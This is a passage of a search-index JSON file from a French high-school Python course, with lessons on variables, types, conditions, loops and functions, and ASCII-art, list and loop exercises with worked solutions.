'Fiona', 'espece': 'Renard', 'race': 'Argent\u00e9', 'sexe': 'Femelle'},\n    {'id': 2, 'nom': 'Rex', 'espece': 'Renard', 'race': 'Arctique', 'sexe': 'M\u00e2le'},\n    {'id': 3, 'nom': 'Coco', 'espece': 'Renard', 'race': 'Rouge', 'sexe': 'M\u00e2le'}\n]\n</code></pre></p>"},{"location":"premiere/Aides/Revisions/exos_boucles/","title":"R\u00e9visions boucles","text":""},{"location":"premiere/Aides/Revisions/exos_boucles/#ascii-art","title":"ASCII Art","text":"<p>L\u2019ASCII art est une forme d\u2019art num\u00e9rique qui utilise les caract\u00e8res de la table ASCII pour cr\u00e9er des images ou des illustrations.</p>"},{"location":"premiere/Aides/Revisions/exos_boucles/#exemples","title":"Exemples","text":"<p>Quelles formes g\u00e9om\u00e9triques sont affich\u00e9es \u00e0 l'aide de ces fonctions ?</p> <pre><code>    def f1(n:int) -&gt; None:\n        for i in range(n):\n            ligne = \"*\"*n\n            print(ligne)\n\n    def f2(n:int) -&gt; None:\n        for i in range(1,n+1):\n            ligne = \"*\"*i\n            print(ligne)\n\n    def f3(n:int) -&gt; None:\n        for i in range(n):\n            ligne = \" \"*i + \"\\\\\"\n            print(ligne)\n</code></pre>"},{"location":"premiere/Aides/Revisions/exos_boucles/#exercices","title":"Exercices","text":"<p>\u00c9crire les fonctions qui permettent d'obtenir les figures suivantes:  </p> <pre><code>    &gt;&gt;&gt; triangle2(3)\n\n    ***\n    **\n    *\n</code></pre> <pre><code>    &gt;&gt;&gt; carre_creux(4)\n\n    ****\n    *  *\n    *  *\n    ****\n\n    # Aide\n\n    def carre_creux(n):\n        ligne='#'*......\n        print(..............)\n        for i in range(.......):\n            ligne=..........\n            print(.........)\n        ligne=...........\n        print(...........)\n</code></pre> <pre><code>    &gt;&gt;&gt; triangle3(3)\n\n    ***\n     **\n      *\n\n    # Aide\n\n    def triangle3(n):\n        for i in range(n):\n            ligne=.............\n            print(..........)\n</code></pre> <pre><code>    &gt;&gt;&gt; diagonale2(3)\n\n          /\n         /\n        /  \n</code></pre> <pre><code>    &gt;&gt;&gt; pyramide(3)\n\n          *\n         ***\n        *****\n\n    &gt;&gt;&gt; pyramide(4)\n\n           *\n          ***\n         *****\n        *******\n</code></pre> <pre><code>    &gt;&gt;&gt; losange(3)\n\n          @\n         @@@\n        @@@@@\n         @@@\n          @\n\n    &gt;&gt;&gt; losange(4)\n\n           @\n          @@@\n         @@@@@\n        @@@@@@@\n         @@@@@\n          @@@\n           @\n</code></pre>"},{"location":"premiere/Aides/Revisions/exos_dictionnaires/","title":"R\u00e9visions dictionnaires","text":"<p>TODO  </p>"},{"location":"premiere/Aides/Revisions/exos_listes/","title":"R\u00e9visions listes","text":""},{"location":"premiere/Aides/Revisions/exos_listes/#niveau-facile","title":"Niveau facile","text":"<ol> <li> <p>\u00c9crire une fonction <code>double_elements</code> qui prend une liste d'entiers et renvoie une nouvelle liste o\u00f9 chaque \u00e9l\u00e9ment est doubl\u00e9. Exemple : <pre><code>double_elements([1, 2, 3]) # doit renvoyer [2, 4, 6]\n</code></pre></p> </li> <li> <p>\u00c9crire une fonction <code>carres</code> qui prend une liste d'entiers et renvoie une liste contenant le carr\u00e9 de chaque \u00e9l\u00e9ment. Exemple : <pre><code>carres([1, 2, 3, 4]) # doit renvoyer [1, 4, 9, 16]\n</code></pre></p> </li> </ol>"},{"location":"premiere/Aides/Revisions/exos_listes/#niveau-intermediaire","title":"Niveau interm\u00e9diaire","text":"<ol> <li> <p>\u00c9crire une fonction <code>elements_communs</code> qui prend deux listes et renvoie une nouvelle liste contenant les \u00e9l\u00e9ments communs aux deux listes (sans doublons). Exemple : <pre><code>elements_communs([1, 2, 3], [2, 3, 4]) # doit renvoyer [2, 3]\n</code></pre></p> </li> <li> <p>\u00c9crire une fonction <code>extraire_nombres</code> qui prend une liste mixte contenant des entiers, des cha\u00eenes de caract\u00e8res et d'autres types, et renvoie une nouvelle liste contenant uniquement les nombres. Indications :  </p> </li> <li> <p>La fonction <code>isinstance(variable, type)</code> renvoie <code>True</code> si la variable est bien du type demand\u00e9.</p> </li> <li>Cette fonction devra rajouter dans une liste vide les \u00e9l\u00e9ments qui ne sont pas ceux \u00e9gaux \u00e0 cela non d\u00e9sir\u00e9.</li> </ol> <p>Exemple : </p> <pre><code>extraire_nombres([1, \"chat\", 3, \"chien\", 4.5, 6]) # doit renvoyer [1, 3, 4.5, 6]\n</code></pre> <ol> <li>\u00c9crire une fonction <code>supprimer_occurrences</code> qui prend une liste et un \u00e9l\u00e9ment, et renvoie une nouvelle liste en supprimant toutes les occurrences de cet \u00e9l\u00e9ment. Indication : Cette fonction devra rajouter dans une liste vide les \u00e9l\u00e9ments qui ne sont pas ceux \u00e9gaux \u00e0 cela non d\u00e9sir\u00e9.    Exemple : </li> </ol> <pre><code>supprimer_occurrences([1, 2, 3, 2, 4], 2) # doit renvoyer [1, 3, 4]\n</code></pre>"},{"location":"premiere/Aides/Revisions/exos_listes/#niveau-difficile","title":"Niveau Difficile","text":"<ol> <li>\u00c9crire une fonction <code>indices_element</code> qui prend une liste et un \u00e9l\u00e9ment, et renvoie une liste des indices de toutes les occurrences de cet \u00e9l\u00e9ment dans la liste. Exemple : </li> </ol> <pre><code>indices_element([10, 20, 30, 20, 10], 20) # doit renvoyer [1, 3]\n</code></pre> <ol> <li>\u00c9crire une fonction <code>alternance_pairs_impairs</code> qui prend une liste d'entiers et v\u00e9rifie si les \u00e9l\u00e9ments alternent entre pair et impair. Renvoie True si c'est le cas, sinon False. Exemple :</li> </ol> <pre><code>alternance_pairs_impairs([2, 3, 4, 5, 6]) # doit renvoyer True\nalternance_pairs_impairs([2, 2, 4, 5]) # doit renvoyer False\n</code></pre>"},{"location":"premiere/I-Constructions_elementaires/Cours/Cours_1/","title":"Cours 1","text":"\ud83d\udcda Constructions \u00e9l\u00e9mentaires en Python <p>Les fondements de la programmation Python</p> \ud83e\udd16 Qu'est-ce qu'un programme ? \ud83c\udfaf D\u00e9finition Fondamentale              Un programme est une suite d'instructions \u00e9l\u00e9mentaires destin\u00e9es \u00e0 \u00eatre ex\u00e9cut\u00e9es par un ordinateur.          \ud83d\udc0d Langage Python                  Python est un langage de haut niveau, plus proche de nous (utilisateurs) que de l'ordinateur (processeur).              \u26a1 Ex\u00e9cution S\u00e9quentielle                  Les instructions sont r\u00e9alis\u00e9es de mani\u00e8re s\u00e9quentielle - les unes apr\u00e8s les autres, dans l'ordre.              \ud83d\udd27 Les Op\u00e9rateurs              Un op\u00e9rateur est un caract\u00e8re ou un ensemble de caract\u00e8res qui correspond \u00e0 une op\u00e9ration pouvant \u00eatre r\u00e9alis\u00e9e par le processeur.          \ud83d\udcbe Instanciation \ud83c\udfaf Concept d'Instanciation              L'instanciation est une instruction qui permet d'associer une valeur \u00e0 une variable. Une variable en Python est une cha\u00eene de caract\u00e8res que l'on associe \u00e0 un type (domaine de valeurs).          \ud83d\udd17 Op\u00e9rateur d'Assignation                  L'instanciation utilise l'op\u00e9rateur =. Pour la machine, cela revient \u00e0 associer un espace m\u00e9moire \u00e0 la valeur d\u00e9sign\u00e9e.              \ud83c\udff7\ufe0f Variables et Types                  Les variables peuvent contenir diff\u00e9rents types : entiers, cha\u00eenes de caract\u00e8res, tableaux, listes, nombres r\u00e9els, ou objets personnalis\u00e9s.              \ud83d\udcbb Exemples d'Instanciation <pre><code># Instancier a \u00e0 la valeur 42\na = 42\n\n# Instancier ma_chaine_de_caractere \u00e0 la valeur 'Hello World!'\nma_chaine_de_caractere = 'Hello World!'</code></pre>          \ud83d\udca1 Base de la programmation : L'instanciation est l'op\u00e9ration fondamentale qui consiste \u00e0 associer une valeur \u00e0 une variable.      \ud83e\uddee Op\u00e9rations Math\u00e9matiques \ud83c\udfaf Calculs en Python              Python permet de r\u00e9aliser des op\u00e9rations math\u00e9matiques gr\u00e2ce \u00e0 des op\u00e9rateurs qui utilisent 2 valeurs, comme nos op\u00e9rations sur papier.          + Addition Additionne deux nombres - Soustraction Soustrait le second nombre du premier * Multiplication Multiplie deux nombres / Division Divise le premier nombre par le second \ud83d\udcbb Exemples d'Op\u00e9rations <pre><code>a = 3 + 2  # Addition : a = 5\nb = 5 - 3  # Soustraction : b = 2\nc = a * b  # Multiplication : c = 10\nd = b / a  # Division : d = 0.4</code></pre>          \u26a0\ufe0f Important : Les op\u00e9rations math\u00e9matiques sont r\u00e9serv\u00e9es aux variables de type entiers ou nombres r\u00e9els. Attention aux impr\u00e9cisions avec les flottants !      \u2696\ufe0f Op\u00e9rations de Comparaisons \ud83c\udfaf Comparaisons en Python              Python permet de comparer des variables pour \u00e9valuer des relations d'ordre ou d'\u00e9galit\u00e9. Attention : on ne peut comparer que des \u00e9l\u00e9ments du m\u00eame type !          &gt; Sup\u00e9rieur a plus grand que b &lt; Inf\u00e9rieur a plus petit que b &gt;= Sup\u00e9rieur ou \u00e9gal a plus grand ou \u00e9gal \u00e0 b &lt;= Inf\u00e9rieur ou \u00e9gal a plus petit ou \u00e9gal \u00e0 b == \u00c9galit\u00e9 a est \u00e9gal \u00e0 b != Diff\u00e9rence a est diff\u00e9rent de b          \u26a0\ufe0f Erreur fr\u00e9quente : Ne pas confondre <code>=</code> (assignation) et <code>==</code> (comparaison) ! Utiliser <code>=</code> dans une comparaison provoque une SyntaxError.               \ud83d\udeab TypeError : Comparer des \u00e9l\u00e9ments de types diff\u00e9rents g\u00e9n\u00e8re une erreur. Exemple : <code>5 &gt; \"hello\"</code> est invalide.      \ud83d\udcac Affichage et Demande \u00e0 l'Utilisateur \ud83d\udcfa Fonction print()                  Affiche des informations \u00e0 l'\u00e9cran : cha\u00eenes de caract\u00e8res, nombres, r\u00e9sultats de calculs. Peut concat\u00e9ner plusieurs \u00e9l\u00e9ments s\u00e9par\u00e9s par des virgules.              \u2328\ufe0f Fonction input()                  Capture les donn\u00e9es saisies par l'utilisateur. Affiche un message d'invitation et renvoie la saisie sous forme de cha\u00eene de caract\u00e8res.              \ud83d\udcbb Exemples d'Utilisation <pre><code># Affichage simple\nprint(\"Bonjour le monde !\")\n\n# Affichage de plusieurs \u00e9l\u00e9ments\nprint(\"Bonjour\", \"le monde\", 42)  # Affiche : Bonjour le monde 42\n\n# Demande \u00e0 l'utilisateur\nnom = input(\"Quel est votre nom ? \")\nprint(\"Bonjour\", nom)\n\n# Conversion de type pour les nombres\nage_str = input(\"Quel est votre \u00e2ge ? \")\nage = int(age_str)  # Conversion en entier</code></pre>          \u26a0\ufe0f Important : La fonction <code>input()</code> renvoie toujours une cha\u00eene de caract\u00e8res (string). Pour traiter des nombres, il faut convertir le type avec <code>int()</code> ou <code>float()</code>.      \ud83d\udd00 Conditions \ud83c\udfaf Structure Conditionnelle              Les conditions permettent d'ex\u00e9cuter du code selon des crit\u00e8res sp\u00e9cifiques gr\u00e2ce \u00e0 l'instruction if. Elles \u00e9valuent des comparaisons, des \u00e9tats de variables ou des valeurs.          \ud83d\udeaa if                  Ex\u00e9cute le code si la condition est vraie. C'est la structure de base pour les d\u00e9cisions.              \ud83d\udd04 elif                  \"Else if\" - teste une nouvelle condition si la pr\u00e9c\u00e9dente \u00e9tait fausse. Peut \u00eatre r\u00e9p\u00e9t\u00e9 plusieurs fois.              \ud83c\udfc1 else                  Ex\u00e9cute le code si aucune des conditions pr\u00e9c\u00e9dentes n'\u00e9tait vraie. Optionnel.              \ud83d\udcbb Exemple : Test de Majorit\u00e9 <pre><code># Demander \u00e0 l'utilisateur son \u00e2ge\nage = input('Quel est votre \u00e2ge ? ')\nage_entier = int(age)  # Conversion en entier\n\n# Condition d'affichage\nif age_entier &gt;= 18:\n    print('Vous \u00eates majeur')\nelse:\n    print('Vous \u00eates mineur')</code></pre> \ud83d\udcbb Exemple : \u00c9valuation de Notes <pre><code># Demande d'une note (A, B, C)\nnote = input('Quelle est la note \u00e0 \u00e9valuer ? ')\n\nif note == 'A':\n    print('Tr\u00e8s bien')\nelif note == 'B':\n    print('Un peu plus pour exceller')\nelif note == 'C':\n    print('Peut mieux faire')\nelse:\n    print('Poursuis tes efforts')</code></pre>          \ud83d\udca1 Astuce : Le bloc <code>else</code> est optionnel. Si aucune action n'est n\u00e9cessaire quand toutes les conditions sont fausses, vous pouvez l'omettre.               \u26a0\ufe0f Performance : Les conditions sont \u00e9valu\u00e9es dans l'ordre. Placez les conditions les plus probables en premier pour optimiser les performances.      \ud83d\udd04 Boucles \ud83c\udfaf R\u00e9p\u00e9tition de Code              Les boucles permettent de r\u00e9p\u00e9ter un bloc de code plusieurs fois. Python propose deux types principaux : for (nombre d'it\u00e9rations d\u00e9fini) et while (condition de continuation).          \ud83d\udd22 Boucle for                  R\u00e9p\u00e8te un code un nombre d\u00e9fini de fois. Id\u00e9ale quand on conna\u00eet le nombre d'it\u00e9rations \u00e0 l'avance.              \u23f3 Boucle while                  R\u00e9p\u00e8te un code tant qu'une condition reste vraie. Utilis\u00e9e quand le nombre d'it\u00e9rations est inconnu.              \ud83d\udcca range()                  Fonction qui g\u00e9n\u00e8re une s\u00e9quence de nombres. Essentielle pour les boucles for avec compteur.              \ud83d\udcbb Boucle for : Affichage de 1 \u00e0 n <pre><code>n = 30\nfor i in range(1, n+1):\n    print(i)\n\n# Variantes de range() :\n# range(10)      \u2192 0, 1, 2, ..., 9\n# range(1, 10)   \u2192 1, 2, 3, ..., 9\n# range(1, 10, 2) \u2192 1, 3, 5, 7, 9</code></pre> \ud83d\udcbb Boucle while : M\u00eame r\u00e9sultat <pre><code>n = 30\ni = 1\n# On veut afficher les nombres de 1 \u00e0 n\nwhile i &lt;= n:\n    print(i)\n    i = i + 1  # Incr\u00e9mentation obligatoire !</code></pre>          \u26a0\ufe0f Danger : Attention aux boucles infinies ! Dans une boucle <code>while</code>, oublier d'incr\u00e9menter la variable de contr\u00f4le peut cr\u00e9er une boucle qui ne s'arr\u00eate jamais.                \ud83d\udca1 Avantage : La boucle <code>for</code> s'arr\u00eate forc\u00e9ment car elle it\u00e8re sur un nombre d\u00e9fini d'\u00e9l\u00e9ments. Utilisez <code>for</code> quand vous connaissez le nombre d'it\u00e9rations, <code>while</code> pour les conditions dynamiques.       <p> </p>"},{"location":"premiere/I-Constructions_elementaires/Cours/Cours_2/","title":"Cours 2","text":"\ud83d\udcda Types de donn\u00e9es en Python <p>Les types fondamentaux pour structurer vos donn\u00e9es</p> \ud83d\udd18 Les Bool\u00e9ens \ud83c\udfaf Type Bool\u00e9en              Le type bool\u00e9en repr\u00e9sente des valeurs de v\u00e9rit\u00e9 avec seulement deux \u00e9tats possibles : True (vrai) et False (faux). Essentiel pour les conditions et le contr\u00f4le de flux.          \u2705 True                  Valeur vraie. Utilis\u00e9e quand une condition est satisfaite ou un \u00e9tat est actif.              \u274c False                  Valeur fausse. Utilis\u00e9e quand une condition n'est pas satisfaite ou un \u00e9tat est inactif.              \ud83d\udcbb D\u00e9claration de Bool\u00e9ens <pre><code>est_jeune = True\na_termine_cours = False\nest_connecte = True</code></pre> \ud83d\udd17 and                  Op\u00e9rateur ET logique. Retourne True seulement si les deux conditions sont vraies.              \ud83d\udd00 or                  Op\u00e9rateur OU logique. Retourne True si au moins une des conditions est vraie.              \ud83d\udd04 not                  Op\u00e9rateur NON logique. Inverse la valeur bool\u00e9enne (True devient False et vice versa).              \ud83d\udcbb Op\u00e9rateurs Logiques <pre><code># Combinaisons logiques\nest_jeune_et_a_termine = est_jeune and a_termine_cours  # False\nest_jeune_ou_termine = est_jeune or a_termine_cours     # True\nn_est_pas_termine = not a_termine_cours                 # True</code></pre> \ud83d\udd22 Les Nombres \ud83c\udfaf Types Num\u00e9riques              Python propose plusieurs types pour repr\u00e9senter les nombres : les entiers (int) pour les nombres entiers et les flottants (float) pour les nombres d\u00e9cimaux.          \ud83d\udd22 int (Entiers)                  Nombres entiers positifs ou n\u00e9gatifs, sans limite de taille en Python.              \ud83d\udcca float (Flottants)                  Nombres d\u00e9cimaux utilisant la norme IEEE754. Attention aux arrondis !              \ud83d\udcbb D\u00e9claration d'Entiers <pre><code># Entiers positifs et n\u00e9gatifs\na = 42\nb = -54\nannee = 2024\ntemperature = -15</code></pre> \ud83d\udcbb D\u00e9claration de Flottants <pre><code># Nombres d\u00e9cimaux (attention au point !)\npi = 3.14159\nracine_de_deux = 1.4142\nprix = 19.99\ntemperature = -2.5</code></pre>          \u26a0\ufe0f Attention aux Flottants : Les op\u00e9rations sur les flottants peuvent produire des erreurs d'arrondi. \u00c9vitez les comparaisons directes d'\u00e9galit\u00e9 entre flottants.               \ud83d\udca1 Notation D\u00e9cimale : En Python, utilisez le point (.) et non la virgule pour les d\u00e9cimales, suivant la convention anglo-saxonne.      \ud83d\udcdd Caract\u00e8res et Cha\u00eenes \ud83c\udfaf Type Cha\u00eene (str)              En Python, les caract\u00e8res et cha\u00eenes de caract\u00e8res utilisent le m\u00eame type str. Un caract\u00e8re est simplement une cha\u00eene de longueur 1.          \ud83d\udd24 Caract\u00e8re                  Une seule lettre, chiffre ou symbole. Convention : guillemets simples ('a').              \ud83d\udcc4 Cha\u00eene                  S\u00e9quence de caract\u00e8res. Convention : guillemets doubles (\"Hello\").              \ud83d\udd0d Indexation                  Acc\u00e8s aux caract\u00e8res individuels par leur position (commence \u00e0 0).              \ud83d\udcbb D\u00e9claration de Cha\u00eenes <pre><code># Cha\u00eenes et caract\u00e8res\nnom = \"Alice\"\nprenom = \"Bob\"\nlettre = 'a'\nsymbole = '@'</code></pre> \ud83d\udcbb Acc\u00e8s aux Caract\u00e8res <pre><code># Indexation (commence \u00e0 0)\nnom = \"Alice\"\npremiere_lettre = nom[0]   # 'A'\ndeuxieme_lettre = nom[1]   # 'l'\nderniere_lettre = nom[-1]  # 'e' (index n\u00e9gatif)</code></pre> \u2795 Concat\u00e9nation                  Assembler des cha\u00eenes avec l'op\u00e9rateur + pour cr\u00e9er de nouvelles cha\u00eenes.              \ud83d\udd04 R\u00e9p\u00e9tition                  R\u00e9p\u00e9ter une cha\u00eene plusieurs fois avec l'op\u00e9rateur * (multiplication).              \ud83d\udee0\ufe0f M\u00e9thodes                  Nombreuses m\u00e9thodes disponibles : .upper(), .lower(), .replace(), etc.                       \ud83d\udca1 Convention : Utilisez les guillemets simples (') pour les caract\u00e8res seuls et les guillemets doubles (\") pour les cha\u00eenes de caract\u00e8res."},{"location":"premiere/I-Constructions_elementaires/Cours/Cours_4/","title":"Cours 4","text":"\ud83d\udcda Fonctions en Python <p>Modularit\u00e9 et r\u00e9utilisabilit\u00e9 du code</p> \ud83c\udfaf D\u00e9finitions \ud83d\udd27 Qu'est-ce qu'une Fonction ?              Une fonction est un bloc de code r\u00e9utilisable qui effectue une t\u00e2che sp\u00e9cifique. Elle permet de modulariser le code et d'\u00e9viter les r\u00e9p\u00e9titions.          \u2699\ufe0f Fonction                  Bloc de code r\u00e9utilisable qui effectue une t\u00e2che pr\u00e9cise. Peut recevoir des donn\u00e9es et retourner un r\u00e9sultat.              \ud83d\udce5 Param\u00e8tre                  Variable d'entr\u00e9e qui permet \u00e0 la fonction de recevoir des donn\u00e9es pour son fonctionnement.              \ud83d\udce4 Valeur de Retour                  R\u00e9sultat que la fonction renvoie apr\u00e8s avoir effectu\u00e9 ses calculs ou traitements.              \ud83d\udccb Structure d'une Fonction <pre><code>def nom_de_fonction(variable_1: type, variable_2: type) -&gt; type_renvoi:\n    \"\"\"\n    Documentation de la fonction :\n    - Explications de ce que fait la fonction\n    - Description des param\u00e8tres\n    - Description de la valeur de retour\n    \"\"\"\n    # Corps de la fonction\n    resultat = # calculs ou traitements\n    return resultat  # ou None si pas de retour</code></pre>          \ud83d\udca1 Exemple Concret : Convertir des temp\u00e9ratures Celsius en Fahrenheit         Formule : Temperature_Fahrenheit = (Temperature_Celsius \u00d7 9/5) + 32      \ud83d\udcbb Exemples de Fonctions <pre><code>def celsius_vers_fahrenheit(temp_celsius: int) -&gt; float:\n    \"\"\"\n    Convertit une temp\u00e9rature Celsius en Fahrenheit.\n\n    Args:\n        temp_celsius (int): Temp\u00e9rature en degr\u00e9s Celsius\n\n    Returns:\n        float: Temp\u00e9rature en degr\u00e9s Fahrenheit\n    \"\"\"\n    temp_fahrenheit = (temp_celsius * (9/5)) + 32\n    return temp_fahrenheit\n\ndef afficher_bonjour(prenom: str) -&gt; None:\n    \"\"\"\n    Affiche un message de salutation personnalis\u00e9.\n\n    Args:\n        prenom (str): Le pr\u00e9nom de la personne \u00e0 saluer\n\n    Returns:\n        None: Cette fonction n'a pas de valeur de retour\n    \"\"\"\n    print('Bonjour, ' + prenom)\n\n# Utilisation des fonctions\nprint(celsius_vers_fahrenheit(19))  # Affiche: 66.2\nprint(celsius_vers_fahrenheit(25))  # Affiche: 77.0\nafficher_bonjour('Eudes')           # Affiche: Bonjour, Eudes\nafficher_bonjour('Germaine')        # Affiche: Bonjour, Germaine</code></pre> \ud83d\udd0d Anatomie d'une Fonction \ud83c\udff7\ufe0f Mot-cl\u00e9 <code>def</code>                  Indique le d\u00e9but de la d\u00e9finition d'une fonction              \ud83d\udcdb Nom de fonction                  Identifiant unique pour appeler la fonction (ex: <code>celsius_vers_fahrenheit</code>)              \ud83d\udce5 Param\u00e8tres                  Variables d'entr\u00e9e avec leur type (ex: <code>temp_celsius: int</code>)              \ud83d\udcdd Documentation                  Bloc de texte expliquant le r\u00f4le, les param\u00e8tres et le retour              \u2699\ufe0f Corps de fonction                  Instructions \u00e0 ex\u00e9cuter quand la fonction est appel\u00e9e              \ud83d\udce4 Valeur de retour                  R\u00e9sultat renvoy\u00e9 par <code>return</code> (optionnel)                       \u26a0\ufe0f Attention : Une fonction sans <code>return</code> renvoie <code>None</code> par d\u00e9faut.         Exemple : <code>print(afficher_bonjour('Eudes'))</code> affichera <code>None</code> \ud83c\udf0d Variables Locales et Globales \ud83d\udccd Port\u00e9e des Variables              En Python, la port\u00e9e d'une variable d\u00e9termine o\u00f9 elle peut \u00eatre utilis\u00e9e dans le programme.          \ud83c\udfe0 Variable Locale                  D\u00e9finie \u00e0 l'int\u00e9rieur d'une fonction. Accessible uniquement dans cette fonction.              \ud83c\udf10 Variable Globale                  D\u00e9finie en dehors de toute fonction. Accessible partout dans le programme.              \ud83c\udfe0 Exemple : Variable Locale <pre><code>def ma_fonction():\n    variable_locale = 10  # Variable locale\n    print(variable_locale)\n\nma_fonction()              # Affiche 10 \u2705\n# print(variable_locale)   # \u274c Erreur ! Variable non accessible ici</code></pre> \ud83c\udf10 Exemple : Variable Globale <pre><code>variable_globale = 20  # Variable globale\n\ndef ma_fonction():\n    print(variable_globale)  # Acc\u00e8s \u00e0 la variable globale \u2705\n\nma_fonction()                # Affiche 20\nprint(variable_globale)      # Affiche 20</code></pre>          \ud83d\udd27 Modification d'une Variable Globale :         Utilisez le mot-cl\u00e9 <code>global</code> pour modifier une variable globale dans une fonction      \ud83d\udd27 Modification avec <code>global</code> <pre><code>compteur = 0  # Variable globale\n\ndef incrementer():\n    global compteur  # D\u00e9claration n\u00e9cessaire pour modification\n    compteur += 1\n\nprint(compteur)    # Affiche 0\nincr\u00e9menter()\nprint(compteur)    # Affiche 1</code></pre> \ud83d\udca1 Bonnes Pratiques \ud83d\udcdd Documentation                  Utilisez des docstrings pour expliquer le r\u00f4le, les param\u00e8tres et le retour de vos fonctions.              \ud83c\udff7\ufe0f Noms Explicites                  Choisissez des noms de fonctions qui d\u00e9crivent clairement leur action.              \ud83c\udfaf Sp\u00e9cialisation                  Cr\u00e9ez des fonctions courtes qui accomplissent une seule t\u00e2che efficacement.              \ud83d\udcdd Documentation avec Docstrings <pre><code>def calculer_aire_rectangle(longueur: float, largeur: float) -&gt; float:\n    \"\"\"\n    Calcule l'aire d'un rectangle.\n\n    Args:\n        longueur (float): La longueur du rectangle\n        largeur (float): La largeur du rectangle\n\n    Returns:\n        float: L'aire du rectangle\n    \"\"\"\n    return longueur * largeur</code></pre> \ud83c\udff7\ufe0f Noms de Fonctions Explicites <pre><code># \u2705 Bon : nom explicite\ndef calculer_moyenne(notes):\n    return sum(notes) / len(notes)\n\n# \u274c Moins bon : nom peu clair\ndef calc(n):\n    return sum(n) / len(n)</code></pre> \ud83c\udfaf Fonctions Sp\u00e9cialis\u00e9es <pre><code>def est_pair(nombre):\n    \"\"\"V\u00e9rifie si un nombre est pair.\"\"\"\n    return nombre % 2 == 0\n\ndef filtrer_nombres_pairs(liste_nombres):\n    \"\"\"Filtre les nombres pairs d'une liste.\"\"\"\n    return [n for n in liste_nombres if est_pair(n)]</code></pre>          \ud83d\ude80 Conseil : Une fonction bien \u00e9crite est facile \u00e0 comprendre, tester et r\u00e9utiliser !"},{"location":"premiere/I-Constructions_elementaires/Fiches_d_exercices/Exercices_boucles/","title":"Fiche d'exercices : Boucles","text":"\ud83c\udfaf Exercices d'introduction \ud83c\udf1f Niveau Facile \ud83d\udd25 Niveau Interm\u00e9diaire \ud83d\ude80 Niveau Difficile Introduction \ud83e\udd8a Afficher les nombres de 1 \u00e0 100 <p>\u00c9crire un programme qui affiche dans le terminal tous les nombres entre 1 et 100. (\u00e0 l'aide d'une boucle for puis d'une boucle tant que).</p> \u2192 Correction non disponible              <pre><code># Utilisation d'une boucle for\nfor i in range(1, 101):\n    print(i)\n\n# Utilisation d'une boucle while\ni = 1\nwhile i &lt;= 100:\n    print(i)\n    i += 1</code></pre> Introduction \ud83e\udd8a Table de multiplication <p>\u00c9crire un programme qui prend un nombre entier et affiche sa table de multiplication (jusqu'\u00e0 10).</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = int(input(\"Entrez un nombre entier : \"))\n\nfor i in range(1, 11):\n    print(i, \"x\", nombre, \"=\", i * nombre)</code></pre> Introduction \ud83e\udd8a Somme des nombres de 1 \u00e0 100 <p>\u00c9crire un programme qui r\u00e9alise la somme des nombres entiers de 1 jusque 100.</p> \ud83d\udd12 Correction non disponible              <pre><code>somme = 0\nfor i in range(1, 101):\n    somme += i\nprint(\"La somme de 1 \u00e0 100 est\", somme)</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Afficher les nombres pairs entre 1 \u00e0 100 <p>\u00c9crire un programme qui affiche dans le terminal tous les nombres pairs entre 1 et 100.</p> \ud83d\udd12 Correction non disponible              <pre><code># Utilisation d'une boucle for\nfor i in range(1, 101):\n    if i % 2 == 0:\n        print(i)\n\n# Utilisation d'une boucle while\ni = 1\nwhile i &lt;= 100:\n    if i % 2 == 0:\n        print(i)\n    i += 1</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Compter les voyelles <p>\u00c9crire un programme qui lit une cha\u00eene de caract\u00e8res et affiche le nombre de voyelles pr\u00e9sentes dans cette cha\u00eene.</p> \ud83d\udd12 Correction non disponible              <pre><code>phrase = input(\"Donnez votre phrase : \")\nnb_voyelles = 0\nfor lettre in phrase:\n    if lettre in 'aeiouyAEIOUY':\n        nb_voyelles += 1\nprint(\"La phrase compte\", nb_voyelles, \"voyelles.\")</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Inverser une cha\u00eene de caract\u00e8res <p>\u00c9crire un programme qui affiche les caract\u00e8res d'une cha\u00eene de caract\u00e8res dans l'autre sens.</p> <p>Exemple : \"bonjour\" \u2192 \"ruojnob\".</p> \ud83d\udd12 Correction non disponible              <pre><code>phrase = input(\"Donnez votre phrase : \")\nresultat = \"\"\nfor carac in phrase:\n    resultat = carac + resultat\nprint(resultat)</code></pre> Facile \ud83e\udd8a\ud83e\udd8a Somme des chiffres d'un nombre <p>\u00c9crire un programme qui calcule la somme des chiffres d'un nombre donn\u00e9 par l'utilisateur.</p> <p>Exemple : pour 123, il affichera 6.</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = input(\"Donnez votre nombre : \")\nresultat = 0\nfor chiffre in nombre:\n    resultat = resultat + int(chiffre)\nprint(\"La somme des chiffres est :\", resultat)</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Boucle jusqu'\u00e0 un nombre n\u00e9gatif <p>\u00c9crire un programme qui demande en boucle un nombre \u00e0 l'utilisateur. Si le nombre est positif, la boucle continue, si le nombre est n\u00e9gatif, la boucle s'arr\u00eate.</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = int(input(\"Donnez un nombre : \"))\nwhile nombre &gt;= 0:\n    nombre = int(input(\"Donnez un autre nombre : \"))</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Multiples de 3 <p>\u00c9crire un programme qui demande \u00e0 l'utilisateur un nombre et affiche les multiples par 3 cons\u00e9cutifs.</p> <p>Exemple : 1 \u2192 3, 9, 27, 81...</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = int(input(\"Donnez un nombre : \"))\nfor i in range(10):\n    nombre *= 3\n    print(nombre)</code></pre> Interm\u00e9diaire \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Divisions par 2 <p>\u00c9crire un programme qui demande un nombre \u00e0 l'utilisateur et affiche dans le terminal combien de fois celui-ci est divisible par 2.</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = int(input(\"Donnez un nombre : \"))\ncompteur = 0\nwhile nombre &gt; 1:\n    nombre //= 2\n    compteur += 1\nprint(\"Nombre de divisions par 2 :\", compteur)</code></pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Diviseurs et nombres premiers <p>\u00c9crire un programme qui demande un nombre <code>n</code> \u00e0 un utilisateur et affiche dans le terminal ses diviseurs (autre que lui-m\u00eame et 1). S'il n'en a aucun, affiche : \"<code>Aucun diviseur, n est premier.</code>\"</p> \ud83d\udd12 Correction non disponible              <pre><code>nombre = int(input(\"Donnez un nombre : \"))\nfor i in range(2, nombre):\n 